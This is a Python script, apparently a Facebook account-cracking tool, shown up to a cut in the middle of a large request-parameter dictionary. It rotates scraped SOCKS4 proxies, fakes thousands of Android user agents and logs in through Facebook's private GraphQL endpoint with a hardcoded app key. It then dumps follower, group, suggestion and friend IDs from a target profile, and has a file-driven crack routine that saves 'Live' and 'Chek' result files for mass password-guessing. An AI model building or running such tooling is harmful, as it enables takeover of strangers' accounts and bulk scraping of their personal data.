import requests, json, os, random, datetime, time, re, uuid, sys, urllib, base64,string
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as par
from urllib import request
import hashlib,urllib3
import threading
from urllib.error import URLError
from rich import print as prints
ses = requests.Session()
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print(e)
prox=open('.prox.txt','r').read().splitlines()
id,uid,uid2,id3,id4,id5,id6=[],[],[],[],[],[],[]
loop,ok,cp,a2f=0,0,0,0
method=[]
pwnya=[]
rr = random.randint
rc = random.choice
P = '\x1b[1;97m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
N = '\x1b[0m'
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'Live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'Chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
roki = str(uuid.uuid4())
ts = int(time.time())
accesstoken = ''
id_lock = threading.Lock()
ugen = []
for userrandom in range(10000):
	rd = rc(["go","en","id","gn"])
	Model = rc(["22126RN91Y","2212ARNC4L","22120RN86G","22120RN86C","Black Shark 2Pro","M2010J19SY","M2007J1SC","Redmi K20 Pro","M2101K6G","Note 16 Pro","2311DRK48C","2207122MC","Redmi 10 5G","2201123G","MI NOTE LTE","Mi 11 LE","23028RN4DG","K60E","QIN3ULTRA","21091116UI","Redmi 10I","M2004J7AC","HM 1S","Redmi 5 pro,","Redmi 5Plus","Redmi 85781","2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"])
	Build = rc(["TP1A.220624.014","RKQ1.200826.002","NUF26N","KOT49H","HM2014011","G66T1906251CN00MPP","OPM1.171019.019","SKYW1908301CN00MP6","GRI40","MBFMIEK","01AQKQ1.191014.001","KASE2208050OS00MP4","PKQ1.190319.001","KTU84P","JLS36C","NJH47F","N2G47H","MMB29M"])
	RuRu = rc(["en-in","pt-BR","ru-ru","en-gb","en-us","zh-cn","zh-tw","en-US","es-mx"])
	Realme1 = rc(["en-in","pt-BR","ru-ru","en-gb","en-us","zh-cn","zh-tw","en-US","es-mx"])
	Realme2 = rc(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"])
	Realme3 = rc(["TP1A.220624.014","RKQ1.200826.002","NUF26N","KOT49H","HM2014011","G66T1906251CN00MPP","OPM1.171019.019","SKYW1908301CN00MP6","GRI40","MBFMIEK","01AQKQ1.191014.001","KASE2208050OS00MP4","PKQ1.190319.001","KTU84P","JLS36C","NJH47F","N2G47H","MMB29M","PPR1.180610.011"])
	Xiaomi = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {RuRu}; {Model} Build/{Build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))}.0 Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(5,15))}.{str(rr(5,10))}.{str(rr(10,50))}'
	Xiaomi1 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {RuRu}; {Model} Build/{Build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(5,15))}.{str(rr(5,10))}.{str(rr(10,50))}-{rd}'
	Xiaomi2 = f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {Model} Build/{Build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/351.0.0.6.115;]'
	Xiaomi3 = f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {RuRu}; {Model} Build/{Build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 OPR/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(80000,200000))}'
	Xiaomi4 = f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {RuRu} {Build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(4,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Safari/537.36 YandexSearch/{str(rr(10,30))}.{str(rr(50,100))}.{str(rr(1,10))}/apad YandexSearchBrowser/{str(rr(10,30))}.{str(rr(50,100))}.{str(rr(1,10))}'
	Xyraa1 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {Realme1}; {Realme2} Build/{Realme3}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))}.0 Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36'
	Xyraa2 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {Realme1}; {Realme2} Build/{Realme3}) AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(1,10))} UCBrowser/{str(rr(1,30))}.{str(rr(1,10))}.0.{str(rr(1000,5000))} (SpeedMode) U4/{str(rr(1,10))}.0 UCWEB/{str(rr(1,10))} Mobile Safari/534.30'
	Xyraa3 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {Realme1}; {Realme2} Build/{Realme3}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 RealmeBrowser/{str(rr(30,50))}.{str(rr(1,10))}.0.{str(rr(1,10))}'
	XyraaDev = random.choice([Xiaomi,Xiaomi1,Xiaomi2,Xiaomi3,Xiaomi4,Xyraa1,Xyraa2,Xyraa3])
	ugen.append(XyraaDev)

def generate_machine_id():
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'
    return ''.join(random.choices(chars, k=random.randint(20, 28)))

def generate_conn_uuid():
    return base64.b64encode(os.urandom(12)).decode()

def generate_usdid():
    uid_part = str(uuid.uuid4())
    ts_part = int(time.time())
    sig = base64.b64encode(os.urandom(48)).decode().replace('=','').replace('+','_').replace('/','_')
    return f'{uid_part}.{ts_part}.{sig}'

def banner():
    prints(f'''[bold green]
 ______ ____   _____ _   _  _______        __
|  ____|  _ \ / ____| \ | ||  ____\ \    / /
| |__  | |_) | |    |  \| || |__   \ \  / /
|  __| |  _ <| |    | . ` ||  __|   \ \/ /
| |    | |_) | |____| |\  || |____   \  /
|_|    |____/ \_____|_| \_||______|   \/

-----------------------------------------------------------------
        [bold white] ''')


def cek_token(token):
    try:
        r = requests.get(f'https://graph.facebook.com/me?fields=id,name&access_token={token}', timeout=10)
        data = r.json()
        if 'id' in data and 'name' in data:
            return True
        return False
    except:
        return False

def x1():
    END = "[FBAN/FB4A;F"+"BAV/"+"106"+".0.0.26.68;FBBV/"+"106;F"+"BDM/{"+"density="+"3.0,wid"+"th=750"+",height=1334};FBLC/it_"+"IT;FBRV/106."+"0.0.26.6"+"8;FBCR/Etisalat"+"Afg"+"hanistan;FBMF/Infi"+"nix_"+"Note_8i;FBBD/Infi"+"nix_Note_8i;FBPN/c"+"om.facebook.katana"+";FBDV/I"+"nfinix_Note_8i_10_0;FBSV/10.0;FBOP/1;FBCA/"+"x86:armeabi-v7a;]"
    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";"+END
    return ua

def Login_Manual():
    global accesstoken, uid, pw
    uid_input = input(f'{P}[ + ] Masukkan UID/Email : ')
    pw_input = input(f'{P}[ + ] Masukkan Password  : ')
    uid = uid_input
    pw = pw_input
    try:
        device_id_val = str(uuid.uuid4())
        family_device_id_val = str(uuid.uuid4())
        app_scope_id_val = str(uuid.uuid4())
        zero_f_device_id_val = str(uuid.uuid4())
        machine_id_val = generate_machine_id()
        usdid_val = generate_usdid()
        headers = {
            'Host': 'b-graph.facebook.com',
            'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
            'Priority': 'u=0',
            'X-Zero-Eh': '664c0faaac849cb891d0a261fbb72a12',
            'User-Agent': '[FBAN/FB4A;FBAV/555.0.0.49.59;FBBV/926293029;FBDM/{density=2.0,width=900,height=1600};FBLC/id_ID;FBRV/0;FBCR/PSN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960N;FBSV/9;FBOP/1;FBCA/x86_64:arm64-v8a;]',
            'X-Fb-Friendly-Name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
            'X-Zero-F-Device-Id': zero_f_device_id_val,
            'X-Graphql-Request-Purpose': 'fetch',
            'X-Fb-Device-Group': '4025',
            'X-Tigon-Is-Retry': 'False',
            'X-Graphql-Client-Library': 'graphservice',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Fb-Net-Hni': '51000',
            'X-Fb-Sim-Hni': '51000',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-Zero-State': 'unknown',
            'X-Meta-Zca': 'empty_token',
            'App-Scope-Id-Header': app_scope_id_val,
            'X-Fb-Connection-Type': 'WIFI',
            'X-Meta-Usdid': usdid_val,
            'X-Fb-Http-Engine': 'Tigon/Liger',
            'X-Fb-Client-Ip': 'True',
            'X-Fb-Server-Cluster': 'True',
            'X-Fb-Conn-Uuid-Client': generate_conn_uuid(),
        }
        apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw_input)
        params = {
            "method": "post",
            "pretty": "false",
            "format": "json",
            "server_timestamps": "true",
            "locale": "id_ID",
            "purpose": "fetch",
            "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
            "fb_api_caller_class": "graphservice",
            "client_doc_id": "119940804217734265480409226803",
            "fb_api_client_context": json.dumps({
                "is_background": False
            }),
            "variables": json.dumps({
                "params": {
                    "params": json.dumps({
                        "params": json.dumps({
                            "server_params": {
                                "device_id": device_id_val,
                                "server_login_source": "login",
                                "waterfall_id": str(uuid.uuid4()),
                                "attestation_result": {
                                    "errorMessage": "KeyAttestationException: No key found!"
                                },
                                "machine_id": machine_id_val,
                                "from_native_screen": True,
                                "credential_type": "password",
                                "password": apcb,
                                "try_num": "1",
                                "family_device_id": family_device_id_val,
                                "event_flow": "login_manual",
                                "event_step": "home_page",
                                "is_from_logged_in_switcher": False,
                                "contact_point": uid_input,
                            }
                        })
                    }),
                    "bloks_versioning_id": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
                    "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
                },
                "scale": "2",
                "nt_context": {
                    "using_white_navbar": True,
                    "styles_id": "6100e7e89411ccf67ace027cedecd84f",
                    "pixel_ratio": 2,
                    "is_push_on": True,
                    "debug_tooling_metadata_token": None,
                    "is_flipper_enabled": False,
                    "theme_params": [
                        {
                            "value": [],
                            "design_system_name": "FDS"
                        }
                    ],
                    "bloks_version": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
                }
            }),
            "fb_api_analytics_tags": json.dumps(["GraphServices"]),
            "client_trace_id": str(uuid.uuid4()),
        }
        z = requests.post('https://b-graph.facebook.com/graphql', headers=headers, params=params)
        response = z
        if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
            try:
                token_match = re.search(r'"access_token"\s*[=:,\s"\\]*([A-Za-z0-9\-_]+)', response.text.replace('\\', ''))
                if token_match:
                    accesstoken = token_match.group(1)
                else:
                    token_match2 = re.search(r'access_token["\s\\:=]+([A-Za-z0-9\|]+)', response.text)
                    if token_match2:
                        accesstoken = token_match2.group(1)
            except:
                pass
            if accesstoken:
                open('.token.txt', 'w').write(accesstoken)
                print(f'\n{H}[ + ] Login Berhasil! Token disimpan.{P}')
                return True
            else:
                print(f'\n{K}[ ! ] Login berhasil tapi token tidak ditemukan di response.{P}')
                return False
        else:
            return False
    except Exception as e:
        print(f'\n{K}[ ! ] Error: {e}{P}')
        return False


def menu_login():
    global accesstoken
    token_valid = False
    try:
        saved_token = open('.token.txt', 'r').read().strip()
        if saved_token:
            print(f'{P}[ * ] Mengecek token tersimpan...{P}')
            if cek_token(saved_token):
                accesstoken = saved_token
                token_valid = True
                print(f'{H}[ + ] Token masih aktif!{P}')
            else:
                print(f'{K}[ ! ] Token tidak aktif, silakan login ulang.{P}')
    except IOError:
        pass
    if not token_valid:
        berhasil = False
        while not berhasil:
            berhasil = Login_Manual()
            if not berhasil:
                print(f'{K}[ ! ] Login gagal, coba lagi...{P}')
    menu_dump()


def menu_dump():
    print(f'\n{P}[ 1 ] Dump Followers')
    print(f'[ 2 ] Dump Group Member')
    print(f'[ 3 ] Dump Saran Teman')
    print(f'[ 4 ] Dump Friendlist{P}')
    pilih = input(f'{P}[ + ] Pilih menu : ')
    if pilih == '1':
        dump_follower()
    elif pilih == '2':
        dump_grup()
    elif pilih == '3':
        dump_saranteman()
    elif pilih == '4':
        dump_friendlist()
    else:
        print(f'{K}[ ! ] Pilihan tidak valid{P}')
        menu_dump()


def Crack_file():
	try:
		fileX = input (f' • File path  : ')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		atur_id()
	except IOError:
		Crack_file()


def _extract_id_name_from_response(text):
    hasil = []
    try:
        clean = text.replace('\\u0040', '@')
        patterns_id_name = [
            r'"id"\s*:\s*"(\d+)"[^}]*?"name"\s*:\s*"([^"]+)"',
            r'"node"\s*:\s*\{[^}]*?"id"\s*:\s*"(\d+)"[^}]*?"name"\s*:\s*"([^"]+)"',
        ]
        for pat in patterns_id_name:
            matches = re.findall(pat, clean)
            for m in matches:
                entry = f'{m[0]}|{m[1]}'
                if entry not in hasil:
                    hasil.append(entry)
        if not hasil:
            ids = re.findall(r'"id"\s*:\s*"(\d{5,})"', clean)
            names = re.findall(r'"name"\s*:\s*"([^"]{2,})"', clean)
            for i, idnya in enumerate(ids):
                try:
                    nama = names[i]
                    entry = f'{idnya}|{nama}'
                    if entry not in hasil:
                        hasil.append(entry)
                except:
                    pass
    except:
        pass
    return hasil


def _get_page_has_next(resp_text, cursor_field_name):
    try:
        pattern = r'"page_info"\s*:\s*\{[^}]*?"' + re.escape(cursor_field_name) + r'"[^}]*?"has_next_page"\s*:\s*(true|false)[^}]*?\}'
        m = re.search(pattern, resp_text)
        if m:
            return m.group(1)
        pattern2 = r'"page_info"\s*:\s*\{[^}]*?"has_next_page"\s*:\s*(true|false)[^}]*?"' + re.escape(cursor_field_name) + r'"[^}]*?\}'
        m2 = re.search(pattern2, resp_text)
        if m2:
            return m2.group(1)
    except:
        pass
    return None


def dump_follower():
    global id
    target_id = input(f'{P}[ + ] Masukkan ID Target : ')
    pagination_raw = f'profile_list:{target_id}:followers'
    paginationPK = base64.b64encode(pagination_raw.encode()).decode()
    cursor = None
    print(f'\n{P}[ * ] Mulai dump followers...{P}')
    conn_size = [10]

    def fetch_page(cursor_val):
        machine_id_val = generate_machine_id()
        usdid_val = generate_usdid()
        zero_f_device_id_val = str(uuid.uuid4())
        app_scope_id_val = str(uuid.uuid4())
        headers = {
            'Host': 'graph.facebook.com',
            'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"AtConnection"}',
            'X-Fb-Product-Log': f'graphql:{str(uuid.uuid4())}',
            'X-Fb-Rmd': 'state=URL_ELIGIBLE',
            'Priority': 'u=0',
            'User-Agent': '[FBAN/FB4A;FBAV/555.0.0.49.59;FBBV/926293029;FBDM/{density=2.0,width=900,height=1600};FBLC/en_US;FBRV/0;FBCR/PSN;FBMF/Honor;FBBD/Honor;FBPN/com.facebook.katana;FBDV/BVL-AN16;FBSV/9;FBOP/1;FBCA/x86_64:arm64-v8a;]',
            'X-Graphql-Request-Purpose': 'fetch',
            'X-Fb-Friendly-Name': 'ProfileList_At_Connection_Pagination_ProfileList_profile_list_item_edges',
            'X-Zero-F-Device-Id': zero_f_device_id_val,
            'X-Zero-Eh': '2,,AWf8cHc3wiUARmzETDX6fYOnLAVMkV3mlfSPTdl2Vr-mNlkIKHbhvnxjoFp03Wzi1b0',
            'X-Fb-Integrity-Machine-Id': machine_id_val,
            'X-Fb-Device-Group': '4025',
            'X-Tigon-Is-Retry': 'False',
            'X-Graphql-Client-Library': 'graphservice',
            'X-Fb-Sim-Hni': '51000',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Fb-Net-Hni': '51000',
            'Content-Encoding': 'gzip',
            'Authorization': f'OAuth {accesstoken}',
            'X-Meta-Zca': 'empty_token',
            'App-Scope-Id-Header': app_scope_id_val,
            'X-Fb-Connection-Type': 'WIFI',
            'X-Meta-Usdid': usdid_val,
            'X-Fb-Http-Engine': 'Tigon/Liger',
            'X-Fb-Client-Ip': 'True',
            'X-Fb-Server-Cluster': 'True',
            'X-Fb-Conn-Uuid-Client': generate_conn_uuid(),
        }
        variables = {
            "vdmc_deprecate_sfvc_fields": False,
            "use_separate_query_for_video_label": False,
            "thread_fbid": None,
            "stars_viewer_eligibility": None,
            "skip_work_info_fields": False,
            "strip_notif_story": False,
            "skip_reactors_on_pagination": False,
            "skip_groups_unused_fields": False,
            "skip_group_fields": False,
            "should_fetch_augment_stars": False,
            "should_use_poke_fields_fragment": True,
            "should_skip_viewer_profile_permissions": False,
            "should_skip_custom_and_corp_labels": False,
            "should_include_cix_nt_presentation": False,
            "skip_group_composer_anon_info": False,
            "disable_story_menu_actions": False,
            "should_fetch_video_label_from_attachment": False,
            "should_fetch_video_focus_point": False,
            "should_include_personalized_ufi": True,
            "should_fetch_thread_info_for_community_chats": True,
            "include_shareable_url": False,
            "should_fetch_sponsored_bumpers": False,
            "should_fetch_seen_state": False,
            "enable_hide_unhide_bottomsheet_plugins": False,
            "skip_attachments": False,
            "vdmc_deprecate_sfvc_long_press_actions": False,
            "should_fetch_is_ppc": False,
            "should_prefetch_comment_in_fb_shorts": False,
            "should_fetch_reels_default_thumbnail": False,
            "show_comment_insights_in_permalink": False,
            "should_fetch_profile_navigation_info": False,
            "should_fetch_prefetchable_video_metadata": False,
            "should_fetch_pinned_comment": False,
            "include_stars_ufi_metadata": False,
            "should_fetch_comment_ads_cta_fragment": False,
            "should_fetch_owner_edit_fields": False,
            "session_scroll_speed": 0,
            "should_include_follow_and_subscribe_status": False,
            "should_fetch_video_captions": False,
            "should_fetch_meta_ai_context_provider_socket": False,
            "should_fetch_dubbed_mapping_track": False,
            "ad_profile_picture_size": 110,
            "should_fetch_is_reshareable_with_filter": False,
            "video_channel_id": None,
            "should_defer_dm_params": False,
            "should_fetch_is_ig_xar_reels_video": False,
            "should_fetch_interesting_top_level_comments": False,
            "should_fetch_multi_photo_attachment": False,
            "should_fetch_imagine_me_cta": False,
            "should_fetch_should_show_translation_label_on_original": False,
            "should_fetch_ig_backed_page": False,
            "use_audio_asset_id_new": False,
            "should_fetch_gen_ai_deterministic_entry_point": False,
            "fetch_reply_approximate_position": False,
            "skip_eligible_actors_fetch": False,
            "should_fetch_feed_share_later_info": True,
            "should_fetch_feed_mv_friction_fragment": False,
            "should_fetch_edge_intelligence_embeddings": False,
            "should_fetch_preq_signals": False,
            "should_defer_negative_feedback_actions": False,
            "should_fetch_disable_3d_motion_setting": False,
            "feedback_reactions_floating_effect": False,
            "should_fetch_creator_playlist_next_video": False,
            "should_fetch_closed_captions": False,
            "social_bubbles_metadata_v2_engagement_filters": ["POSITIVE_REACTIONS"],
            "should_include_stars_vod_ticker": False,
            "should_fetch_container_story": False,
            "should_fetch_gen_ai_deep_dive_cta_suggestions_previews": False,
            "should_fetch_topic_pill_render_location": False,
            "should_fetch_augment_storefront": False,
            "should_fetch_comment_share_context": False,
            "skip_top_level_comments_count": False,
            "vdmc_deprecate_sfvc_sort_key": False,
            "should_fetch_cta_attachments_v2": False,
            "should_fetch_byoa_fields": False,
            "should_fetch_fallback_actions": False,
            "enable_target_media_feedback_important_reactors": True,
            "should_include_location_metadata": False,
            "news_feed_only": False,
            "should_fetch_unfollow_option": False,
            "include_image_preview_payload": False,
            "include_pinned_reels": False,
            "enable_pada": False,
            "should_fetch_permalink_aspect_ratio": False,
            "should_fetch_augment_search_prompt": False,
            "icon_scale": 1,
            "include_post_header_simplification": False,
            "should_fetch_anon_to_nickname_migration_bottomsheet": False,
            "should_fetch_action_chip_search_keyword": False,
            "should_fetch_ats_nt_view": False,
            "should_fetch_1p_preferred_thumbnail": False,
            "include_restriction_notice": False,
            "should_defer_post_loop_params": False,
            "ar_effect_capabilities": [],
            "should_defer_nfa": False,
            "should_fetch_story_view_count": False,
            "should_fetch_rewritten_queries": False,
            "enable_fetch_group_reportable_type": False,
            "should_defer_actor_fields": False,
            "max_cover_image_prefetch_count": 0,
            "satp_thumbnail_width": 0,
            "should_load_quick_promotion": False,
            "stars_entrypoint_cta_enabled": False,
            "enable_download": False,
            "should_fetch_allow_freeform_prompts": False,
            "should_fetch_new_friend_data": False,
            "enable_comment_reply_bottomsheet_plugins": False,
            "remove_viewer_feedback_reaction_info_field": False,
            "show_profiles_for_seen": False,
            "should_fetch_aggregated_feedback_counts": False,
            "should_load_video_inline_survey": False,
            "enable_bottomsheet_plugins": False,
            "remove_feedback_information": False,
            "referral_source_augment_profile_id": None,
            "should_fetch_page_private_reply_delegate_page_id": False,
            "should_fetch_ads_blingbar_customization_data": False,
            "query_for_can_be_invited_by_viewer": False,
            "should_fetch_ai_styles_cta": False,
            "defer_story_attachments_subattachments": False,
            "should_fetch_music_attribution_metadata": False,
            "vdmc_deprecate_sfvc_effects_info": False,
            "should_fetch_social_proof_reshare_count": False,
            "device_height_for_image": 0,
            "should_fetch_video_focus": False,
            "should_fetch_reshare_filter_metadata": False,
            "should_enable_lfv_chapters": False,
            "non_member_group_id": "",
            "messenger_source_thread_id": None,
            "max_prefetchable_video_count_in_headload": -1,
            "should_fetch_should_query_search": False,
            "should_defer_meta_ai_context_provider_socket": False,
            "should_fetch_is_reels_video": False,
            "should_skip_fab_convo_starters": False,
            "enable_vowel_vdd_overlay": False,
            "skip_actor_story_status_fields": False,
            "is_in_ccp_aggregated_feedback_exp": False,
            "contextual_profile_context": None,
            "enable_fetching_first_frame_thumbnail_from_attachment": False,
            "enable_reels_brs_content_blocklist": False,
            "include_do_wa_nux_state": True,
            "inline_text_bolding_comment_enabled": False,
            "num_friend_presence": 3,
            "is_work_build": False,
            "enable_edit_comment_with_ai_bottomsheet_plugins": False,
            "inline_replies_count": 1,
            "social_bubbles_actor_filters": ["FRIENDS"],
            "saved_lists_enabled": False,
            "should_fetch_adaptive_ufi": False,
            "feed_story_render_location": None,
            "should_fetch_message_post_author_dwell": False,
            "include_video_highlights_info": False,
            "ad_id": None,
            "group_id_list": [],
            "should_fetch_notif_token": False,
            "remove_attachment_feedback": False,
            "is_music_comment_enabled": False,
            "should_fetch_delegate_page_id": False,
            "enable_vdmc_migrate_is_reshare": False,
            "include_previous_nickname_info": False,
            "should_fetch_single_photo_attachment": False,
            "should_include_rate_limit_transparancy_fields": False,
            "enable_fetch_business_content_type": False,
            "should_fetch_subscribe_status_for_x_app_follows": False,
            "include_marketplace_ads_fields": False,
            "enable_fetching_eligible_for_comment_sheet_from_attachment": False,
            "include_live_ring_fields": False,
            "should_include_friend_metadata": False,
            "remove_augments": False,
            "should_fetch_social_proof_combined_share_count": False,
            "should_fetch_m2_1_from_attachment": False,
            "include_inform_treatment": False,
            "enable_friendship_status_on_actors": True,
            "should_include_friend_actions": False,
            "enable_add_icon": True,
            "is_for_try_it_surface": False,
            "full_list_type": "FOLLOWERS",
            "include_feed_ad_sensitive_vertical_info": False,
            "enable_post_header_add_friend": False,
            "should_fetch_is_from_priority_ranking_funnel": False,
            "should_fetch_auto_dubbing_in_progress": False,
            "should_fetch_cache_score_tab": False,
            "should_include_friend_watch_count": False,
            "scale": "2",
            "should_fetch_waist_fragment_async": False,
            "local_scroll_speed": 0,
            "include_do_nux_state": True,
            "disable_goodwill_from_comments": False,
            "should_fetch_top_fans_subsection": True,
            "include_comment_markdown": False,
            "enable_fetching_video_owner_type_from_attachment": False,
            "should_fetch_description_translation": False,
            "fb_shorts_group_author_picture_size": 110,
            "include_comment_direct_parent": False,
            "should_include_future_of_feed_info": False,
            "include_cix_screen": False,
            "should_fetch_reels_ads_caption_fragment": False,
            "should_include_privacy_targeting": False,
            "sticker_labels_enabled": False,
            "website_preview_enabled": False,
            "include_affiliate_link_overlay": False,
            "should_include_story_metadata": False,
            "include_owning_profile_metadata": False,
            "disable_inline_follow": False,
            "should_fetch_augments_from_attachment": False,
            "fetch_profile_ring_bucket_content_hash": False,
            "in_channel_eligibility_experiment": False,
            "include_social_context": False,
            "skip_for_video_delivery_migration": False,
            "should_fetch_size_aware_video_delivery_fragment": False,
            "enable_comment_voting": False,
            "video_delivery_caller_identifier": "VDD",
            "remove_unused_graphql_fields_group_composer_traits": False,
            "fetch_profile_pic_expiration_information": False,
            "fetch_comment_inline_survey": False,
            "fetch_cix_screen_nt_payload": True,
            "should_fetch_video_type": False,
            "fetch_actors_count": 10,
            "should_fetch_gen_ai_feed_suggestions_response_category": False,
            "is_editing_data_enabled": False,
            "fetch_contextual_comment_render_style": False,
            "should_fetch_gen_ai_deep_dive_cta_suggestions": False,
            "should_fetch_hot_comment": False,
            "enable_reactions_dock_message": False,
            "epd_feature_switches": None,
            "enabled_group_post_topic": False,
            "skip_sample_entities_fields": False,
            "should_fetch_community_notes_authoring_info": False,
            "should_fetch_lfv_clip_augment": False,
            "enable_video_model_consolidation": False,
            "fetch_watch_topic_info": False,
            "enable_story_ring": True,
            "enable_gen_ai_content_transparency_in_comments": False,
            "should_fetch_full_relevant_comments": True,
            "should_fetch_eligible_for_comment_sheet": False,
            "source_id": target_id,
